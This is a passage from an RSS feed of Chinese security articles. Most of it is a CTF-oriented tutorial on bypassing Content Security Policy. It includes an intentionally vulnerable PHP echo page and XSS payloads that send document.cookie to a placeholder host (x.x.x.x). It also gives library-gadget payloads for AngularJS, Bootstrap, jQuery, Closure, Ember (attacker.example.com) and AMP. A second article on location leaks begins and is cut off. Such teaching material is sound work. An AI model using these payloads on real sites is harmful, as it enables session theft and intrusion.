&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;CSP&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;Your GET content:&amp;#34;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--b.php--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;CSP&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;CSP&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;Your GET content:&amp;#34;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前面的 a.php 做了 CSP 保护策略，而 b.php 没有保护。&lt;/p&gt;&lt;p&gt;so，我们可以在 b 页面新建 iframe 用 javascript 直接操作 a 页面的 dom：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- xss 代码，要注意 url 编码 --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;iframe&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;./a.php&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(()=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http://x.x.x.x/cookie/&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;location绕过&lt;/b&gt;&lt;/p&gt;&lt;p&gt;有的情况 csp 会使用 script-src &amp;#39;unsafe-inline&amp;#39;; 这个地方可以直接用location.href(window.location/window.open) 绕过&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;127.0.0.1/csp/?twosecurity=&amp;lt;script&amp;gt;location.href=&amp;#39;http://x.x.x.x/cookie/&amp;#39;%2bescape(document.cookie);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;CDN绕过&lt;/b&gt;&lt;/p&gt;&lt;p&gt;一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他 CDN 上的 JS 框架，如果 CDN 上存在一些低版本的框架，就可能存在绕过 CSP 的风险。&lt;/p&gt;&lt;blockquote&gt;CDN，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN 的关键技术主要有内容存储和分发技术。&lt;/blockquote&gt;&lt;p&gt;这里的 CSP 引用了 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//cloudflare.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;cloudflare.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; CDN 服务，于是可以采用了低版本的 angular js 模板注入来绕过 CSP，如下&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;!-- foo=&amp;#34;--&amp;gt;
&amp;lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&amp;gt;
&amp;lt;/script&amp;gt;
&amp;lt;div ng-app&amp;gt;
    {{constructor.constructor(&amp;#39;alert(document.cookie)&amp;#39;)()}}
&amp;lt;/div&amp;gt;
&amp;#34; --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其原理是，waf 对注释完全可信，所以构造一个 &amp;lt;!-- foo=&amp;#34;bar--&amp;gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34; --&amp;gt;，只要闭合注释内容，就可以让后面的完全可控，再加上 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Client-Side Template Injection&lt;/a&gt; 中的手法，绕过 CSP。  &lt;/p&gt;&lt;p&gt;存在低版本 angular js 的 cdn 服务商列表：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/google/csp-e&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;valuator/blob/master/whitelist_bypasses/angular.js&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;除了低版本 angular js 的模板注入，还有许多库可以绕过 CSP。&lt;/p&gt;&lt;p&gt;比如，如果用了 Jquery-mobile 库，且 CSP 中包含 &amp;#34;script-src &amp;#39;unsafe-eval&amp;#39;&amp;#34; 或者 &amp;#34;script-src &amp;#39;strict-dynamic&amp;#39;&amp;#34;，可以用这个 exp。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div data-role=popup id=&amp;#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#39;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还比如 RCTF2018 题目出现的 AMP 库，可以使用下面的标签获取名字为 FLAG 的 cookie。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;amp-pixel src=&amp;#34;http://x.x.x.x/?cid=CLIENT_ID(FLAG)&amp;#34;&amp;gt;&amp;lt;/amp-pixel&amp;gt;  &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以及，这样的 HTML 代码：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div data-bind=&amp;#34;value:&amp;#39;hello world&amp;#39;&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可这样绕过它：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;switch (node.nodeType) {
    case 1: return node.getAttribute(“data-bind”);
var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
    functionBody = &amp;#34;with($context){with($data||{}){return{&amp;#34; + rewrittenBindings + &amp;#34;}}}&amp;#34;;
return new Function(&amp;#34;$context&amp;#34;, &amp;#34;$element&amp;#34;, functionBody);
return bindingFunction(bindingContext, node);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这些代码创建了一个 eval() 属性。&lt;/p&gt;&lt;p&gt;data-bind=&amp;#34;value: foo&amp;#34;  ==&amp;gt;  eval(&amp;#34;foo&amp;#34;)&lt;/p&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;p&gt;为了构建 XSS，一个基于 knockout 的 JS 应用，攻击者需要注入：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div data-bind=&amp;#34;value: alert(1)&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;p&gt;Ajaxify 小工具使用 class=document-script 将其转换成脚本元素。如果你有一个 XSS 在一个网站上使用 Ajaxify，你只需注入：&lt;/p&gt;&lt;p&gt;Ajaxify：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/browserstate/ajaxify&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/browserstate&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/ajaxify&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div class=&amp;#34;document-script&amp;#34;&amp;gt;alert(1)&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ajaxify 将为你完成后面的工作。&lt;/p&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;p&gt;Bootstrap 拥有“最简单”的小工具，将 HTML 属性值传递给 innerHTML。&lt;/p&gt;&lt;blockquote&gt;Bootstrap 是基于 HTML、CSS、JavaScript 开发的简洁、直观、强悍的前端开发框架，使得 Web 开发更加快捷。&lt;/blockquote&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div data-toggle=tooltip data-html=true title=&amp;#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#39;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;HTML 防护允许 title 属性，因为它通常是安全的。但当与引导和其他数据属性一起使用时，就不一样了。&lt;/p&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;p&gt;Closure 类检测它自己的脚本 URL，然后从相同的位置加载子资源。通过注入其他 HTML 标签，很可能会把 Closure 与从其他地方加载混淆:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//&amp;gt;&amp;lt;/a&amp;gt;
&amp;lt;form id=CLOSURE_UNCOMPILED_DEFINES&amp;gt;
&amp;lt;input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;p&gt;Require JS 允许用户指定 JavaScript 文件的“main”模块，这是通过自定义数据属性完成的，而 XSS 过滤器和其他缓解机制并不知道这个数据属性。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;script data-main=&amp;#39;data:1,alert(1)&amp;#39; src=&amp;#39;require.js&amp;#39;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;p&gt;这是一个 inert 脚本标签：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;script src=//i.am.an.invalid.self.closing.script.tag csp=ignores-me /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ember*dev 版本只创建一个有效的副本并重新插入它。自从 strict-dynamic CSP 允许动态插入脚本，用这个 payload 绕过它：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;script type=text/x-handlebars&amp;gt;
 &amp;lt;script src=//attacker.example.com// /&amp;gt;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;p&gt;jQuery 有一个小工具，它接受现有的&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;form class=&amp;#34;child&amp;#34;&amp;gt;
&amp;lt;input name=&amp;#34;ownerDocument&amp;#34;/&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;严格动态的 CSP 阻塞&amp;lt;script&amp;gt;，然后 jQuery 重新插入它。现在它被信任并将执行。&lt;/p&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&lt;ol&gt;&lt;li&gt;绕过 CSP strict-dynamic via Bootstrap&lt;/li&gt;&lt;/ol&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div data-toggle=tooltip data-html=true title=&amp;#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#39;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2. jQuery Mobile 绕过杀毒软件&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div data-role=popup id=&amp;#39;--&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#39;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3. Closure 绕过 NoScript (DOM clobbering)&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;a id=CLOSURE_BASE_PATH href=http://attacker/xss&amp;gt;&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;4. Dojo Toolkit 绕过 ModSecurity CRS&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div data-dojo-type=&amp;#34;dijit/Declaration&amp;#34; data-dojo-props=&amp;#34;}-alert(1)-{&amp;#34;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;5. underscore 模板绕过 CSP unsafe-eval&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;div type=underscore/template&amp;gt; &amp;lt;% alert(1) %&amp;gt; &amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用条件:  &lt;/p&gt;&lt;ul&gt;&lt;li&gt;CDN服务商存在某些低版本的js库&lt;/li&gt;&lt;li&gt;此CDN服务商在CSP白名单中&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;meta网页跳转绕过&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个情况的话，可以利用 meta 标签实现网页跳转：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;127.0.0.1/csp/?twosecurity=&amp;lt;meta http-equiv=&amp;#34;refresh&amp;#34; content=&amp;#34;1;url=http://x.x.x.x/&amp;#34; &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;站点可控静态资源绕过&lt;/b&gt;&lt;/p&gt;&lt;p&gt;给一个绕过 codimd 的 codimd xss &lt;/p&gt;&lt;p&gt;例子中 codimd 的 CSP 中使用了 google-analytics，而 analytics 中提供了自定义 javascript 的功能（google会封装自定义的js，所以还需要 unsafe-eval），于是可以绕过 CSP。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;meta http-equiv=&amp;#34;Content-Security-Policy&amp;#34; content=&amp;#34;default-src &amp;#39;self&amp;#39;; script-src &amp;#39;unsafe-eval&amp;#39; https://www.google-analytics.com&amp;#34;&amp;gt;
&amp;lt;script src=&amp;#34;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有关 &lt;b&gt;CSP绕过 &lt;/b&gt;的内容就简单介绍到这里。更多有关 CTF 的内容请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-11-29-94246164</guid>
<pubDate>Fri, 29 Nov 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>解密：为什么个人位置信息泄露？【附：新版kali】</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-28-94121317.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/94121317&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我发现知乎上有很多这类的问题，&lt;b&gt;手机被监控了怎么办？手机号可以定位吗？我的居住地被黑客知道了怎么办？等等等等，&lt;/b&gt;并且每天都有新的、类似的问题发布，我就搞不懂了，为什么那么多人会有这样的疑问呢？&lt;/p&gt;&lt;p&gt;就在这时，同事小王：“我也觉得有人在跟踪我一样，我又没做啥子，不作亏心事不怕鬼敲门。”&lt;/p&gt;&lt;p&gt;旁边小李：“前两天看新闻，说手机上装了啥子软件app，他老婆就可以看到他每天干啥子，好恐怖哦，幸好我单身。”&lt;/p&gt;&lt;p&gt;我：“你们在说啥子哦，听不懂。”&lt;/p&gt;&lt;p&gt;今天我们就来解密位置信息问题。&lt;/p&gt;&lt;h2&gt;一：QQ聊天泄露定位？&lt;/h2&gt;&lt;blockquote&gt;A：“我们已经是好友啦，一起来聊天吧！”&lt;br/&gt;B：“你是？”&lt;br/&gt;A：“你家住在XX市XX区XX街？”&lt;br/&gt;B：“￥%&amp;amp;#，你怎么知道？”&lt;/blockquote&gt;&lt;p&gt;这是怎么回事呢？&lt;/p&gt;&lt;p&gt;让我们来细细分析，首先，自己的个人资料有没有泄露自己的位置信息呢？检查一下。。。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d573d460284745d28572927811c9ab17_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;259&quot; data-rawheight=&quot;183&quot; class=&quot;content_image&quot; width=&quot;259&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d573d460284745d28572927811c9ab17_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;259&quot; data-rawheight=&quot;183&quot; class=&quot;content_image lazy&quot; width=&quot;259&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d573d460284745d28572927811c9ab17_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;好吧，排除（位置乱填的🤣）&lt;/p&gt;&lt;p&gt;其次，QQ本身有没有把你出卖呢？&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-41bbd5e0635743f33a0fc137f2acc34f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;426&quot; data-rawheight=&quot;317&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;426&quot; data-original=&quot;https://pic4.zhimg.com/v2-41bbd5e0635743f33a0fc137f2acc34f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-41bbd5e0635743f33a0fc137f2acc34f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; 